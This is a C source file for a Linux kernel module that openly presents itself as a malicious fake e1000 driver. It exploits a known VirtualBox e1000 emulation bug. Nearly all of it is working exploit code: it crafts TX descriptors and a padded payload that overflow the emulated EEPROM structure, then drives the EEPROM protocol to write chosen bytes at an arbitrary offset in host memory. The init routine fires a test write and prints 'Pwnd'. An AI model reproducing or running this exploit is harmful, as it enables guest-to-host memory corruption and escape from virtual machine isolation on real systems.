/* Fake e1000 Driver code.
 *
 * Exploit of an e1000 emulation vulnerability found by Sergey Zelenyuk,
 * described here https://github.com/MorteNoir1/virtualbox_e1000_0day.
 * 
 */

#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/gfp.h>
#include <linux/slab.h>
#include <linux/delay.h>

#include "e1k_utils.h"

MODULE_AUTHOR("ndureiss & Choch");
MODULE_DESCRIPTION("Malicious e1k driver");
MODULE_SUPPORTED_DEVICE("none");
MODULE_LICENSE("TLS-SEC");

#define NB_MAX_DESC 256

/* ========================== METHOD DECLARATION ========================== */
static int __init e1k_init(void);
static void __exit e1k_exit(void);
static uint8_t* map_mmio(void);
static void e1k_configure(void);
static void address_overflow(uint16_t new_addr);
static void write_primitive(uint16_t address, uint16_t value);
static void dump_reg(char* regname, uint16_t reg);
static void dump_memory(void* buffer, int size);

/* ==================== GLOBAL VARIABLES DECLARATION ====================== */
uint8_t* bar0;
struct e1000_desc* tx_ring;
uint8_t* tx_buffer;


/* ================================== CORE ================================ */
/* ------------------------------ Constructor ----------------------------- */
static int __init e1k_init(void)
{
	bar0 = map_mmio();
	if (!bar0) {
		pr_info("e1k : failed to map mmio");
		return -1;
	}
	e1k_configure();
    write_primitive(0x1234,0xbabe);
	pr_info("Pwnd");
	return 0;
}
module_init(e1k_init);

/* ------------------------------- Destructor ----------------------------- */
static void __exit e1k_exit(void)
{
	pr_info("Bye Bye");
}
module_exit(e1k_exit);


/* ---------------------------- Useful functions -------------------------- */

/** map_mmio : get virtual address mapped to device physical address
 * @return virtual address of 0xF0000000
 */
static uint8_t* map_mmio(void)
{
	off_t phys_addr = 0xF0000000;
	size_t len = 0x20000;

	uint8_t* virt_addr = ioremap(phys_addr, len);
	if (!virt_addr) {
		pr_info("e1k : ioremap failed to map MMIO\n");
		return NULL;
	}

	return virt_addr;
}

/** e1k_configure : configure network device (e1000) registers */
static void e1k_configure(void)
{
	// Configure general purpose registers
	uint32_t ctrl, tctl, tdlen;
	uint64_t tdba;
	int i;

	ctrl = get_register(CTRL) | CTRL_RST;
	set_register(CTRL, ctrl);

	ctrl = get_register(CTRL) | CTRL_ASDE | CTRL_SLU;
	set_register(CTRL, ctrl);

	// Configure TX registers 
	tx_ring = kmalloc(DESC_SIZE * NB_MAX_DESC, GFP_KERNEL);
	if (!tx_ring) {
		pr_info("e1k : failed to allocate TX Ring\n");
		return;
	}
	// Transmit setup
	for (i = 0; i < NB_MAX_DESC; ++i) {
		tx_ring[i].context.cmd_and_length = DESC_DONE;
	}

	tx_buffer = kmalloc(PAYLOAD_LEN, GFP_KERNEL);
	if (!tx_buffer) {
		pr_info("e1k : failed to allocate TX Buffer\n");
		return;
	}
	// Payload setup
	for (i = 0; i < PAYLOAD_LEN-50; ++i) {
		tx_buffer[i] = 0x61; // Fill with garbage "a"
	}

	tdba = (uint64_t)((uintptr_t) virt_to_phys(tx_ring));
	set_register(TDBAL, (uint32_t) ((tdba & 0xFFFFFFFFULL)));
	pr_info("tdbal = %lx\n", (uint32_t) (tdba & 0xFFFFFFFFULL)); // Don't remove or it will crash the VM when loading module ¯\_(ツ)_/¯
	set_register(TDBAH, (uint32_t) (tdba >> 32));

	tdlen = DESC_SIZE * NB_MAX_DESC;
	set_register(TDLEN, tdlen);

	set_register(TDT, 0);
	set_register(TDH, 0);

	tctl = get_register(TCTL) | TCTL_EN | TCTL_PSP | ((0x40 << 12) & TCTL_COLD) | ((0x10 << 8) & TCTL_CT) | TCTL_RTLC;
	set_register(TCTL, tctl);
}

/** address_overflow : erase EEPROM writing address with new one
 * @param new_addr : the new adress to write in EEPROM
 */
static void address_overflow(uint16_t new_addr)
{
	static int	idx = 0;
	uint32_t	tdt;
	uint64_t 	physical_address;

	struct e1000_context_desc*	context_1	= 	&(tx_ring[idx+0].context);
	struct e1000_data_desc*		data_2		= 	&(tx_ring[idx+1].data);
	struct e1000_data_desc*		data_3		= 	&(tx_ring[idx+2].data);
	struct e1000_context_desc*	context_4	= 	&(tx_ring[idx+3].context);
	struct e1000_data_desc*		data_5		= 	&(tx_ring[idx+4].data);

	//------------- Payload setup -------------//
	
	/* We will overflow on EEProm Struct. Looks like 
	 *		...
	 * 		- enum		m_eState			(32 bits)
	 *		- bool		m_fWriteEnabled		(08 bits)
	 * 		- uint8_t 	Alignment1			(08 bits)
     *		- uint16_t	m_u16Word			(16 bits)
     *		- uint16_t	m_u16Mask			(16 bits)
     *		- uint16_t	m_u16Addr			(16 bits)
	 * 		... 
     */
    tx_buffer[PAYLOAD_LEN - 12]	= 0x01;
    tx_buffer[PAYLOAD_LEN - 11]	= 0x00;
    tx_buffer[PAYLOAD_LEN - 10]	= 0x00;
    tx_buffer[PAYLOAD_LEN - 9]	= 0x00;
	tx_buffer[PAYLOAD_LEN - 8]	= 0x01;
    tx_buffer[PAYLOAD_LEN - 4]	= low16((1 << 15));
    tx_buffer[PAYLOAD_LEN - 3]	= high16((1 << 15));
	tx_buffer[PAYLOAD_LEN - 2]	= low16(new_addr);
	tx_buffer[PAYLOAD_LEN - 1]	= high16(new_addr);
	//-----------------------------------------//

	//----------- Descriptors setup -----------//
	physical_address = virt_to_phys(tx_buffer);

	context_1->lower_setup.ip_config	= 	(uint32_t) 0;
	context_1->upper_setup.tcp_config	= 	(uint32_t) 0;
	context_1->cmd_and_length			= 	(uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | FIRST_PAYLEN);
	context_1->tcp_seg_setup.data		= 	(uint32_t) (MSS_DEFAULT);

	data_2->buffer_addr					= 	(uint64_t) physical_address;
	data_2->lower.data					= 	(uint32_t) (REPORT_STATUS | DESC_DATA | 0x10 | TSE);
	data_2->upper.data					= 	(uint32_t) 0;

	data_3->buffer_addr					= 	(uint64_t) physical_address;
	data_3->lower.data					= 	(uint32_t) (EOP | REPORT_STATUS | DESC_DATA | TSE);
	data_3->upper.data					= 	(uint32_t) 0;

	context_4->lower_setup.ip_config	=	(uint32_t) 0;
	context_4->upper_setup.tcp_config	=	(uint32_t) 0;
	context_4->cmd_and_length			=	(uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | PAYLOAD_LEN);
	context_4->tcp_seg_setup.data		=	(uint32_t) ((0xF << 16));

	data_5->buffer_addr					=	(uint64_t) physical_address;
	data_5->lower.data					=	(uint32_t) (EOP | REPORT_STATUS | DESC_DATA | PAYLOAD_LEN | TSE);
	data_5->upper.data					= 	(uint32_t) 0;
	//-----------------------------------------//

	//--------- Fetch new descriptors ---------//
	idx += 5;
	tdt = (get_register(TDT) + 5) & 0xFFFF;
	set_register(TDT, tdt);
	//-----------------------------------------//
}

void wait_access(void)
{
	uint32_t eecd;

	eecd = get_register(EECD) | EECD_REQ | EECD_FWE_EN;
	set_register(EECD, eecd);

	while (!(get_register(EECD) & EECD_GNT)) {
		ssleep(1);
	}
}

void emul_clock(uint32_t * eecd)
{	
	*eecd = *eecd | EECD_SK;
	set_register(EECD, *eecd);
	udelay(50);

	*eecd = *eecd & ~EECD_SK;
	set_register(EECD, *eecd);
	udelay(50);
}

/* Write two bytes at arbitrary 16-bit offset from m_au16Data */
static void write_primitive(uint16_t address, uint16_t value)
{
	int i;
	uint16_t mask;
	uint32_t eecd;

	// 0. Wait to access the EEPROM
	wait_access();

	// 1. Return in STANDBY
	eecd = get_register(EECD) & ~(EECD_CS | EECD_SK | EECD_DI | EECD_DO);
	set_register(EECD, eecd);
	
	// 2. Go in READING_DI
	wait_access();
	eecd = get_register(EECD) | EECD_CS | EECD_SK;
	set_register(EECD, eecd);
	udelay(50);
	
	emul_clock(&eecd);
	
	eecd = get_register(EECD) | EECD_SK | EECD_DI;
	set_register(EECD, eecd);
	udelay(50);

	emul_clock(&eecd);

	mask = (1 << 7);
	for (i = 0; i < 8; i++) {
		eecd = get_register(EECD) & ~EECD_DI;

		if ((1 << 6) & mask)
			eecd |= EECD_DI;

		set_register(EECD, eecd);
		udelay(50);

		emul_clock(&eecd);
		mask >>= 1;
	}

	address_overflow(address);
	mdelay(5000);
	
	mask = 1 << 15;
	for (i = 0; i < 16; i++) {
		eecd = get_register(EECD) & ~EECD_DI;

		if (value & mask)
			eecd |= EECD_DI;

		set_register(EECD, eecd);
		udelay(50);

		emul_clock(&eecd);
		mask >>= 1;
	}

	/* We leave the "DI" bit set to "0" when we leave this routine. */
	eecd = get_register(EECD) & ~EECD_DI;
	set_register(EECD, eecd);

}

/* Dump Specific Register */
static void dump_reg(char* regname, uint16_t reg)
{
	uint32_t value = get_register(reg);
	pr_info("%-15s  %08x\n", regname, value);
}

/* Dump part of the memory */
static void dump_memory(void* buffer, int size)
{
	int i;

	pr_info("Dumping memory at : %016llx\n", buffer);
	for (i=0; i<size; ++i) {
		pr_info("%02x", *((uint8_t*)buffer + i));
	}
}
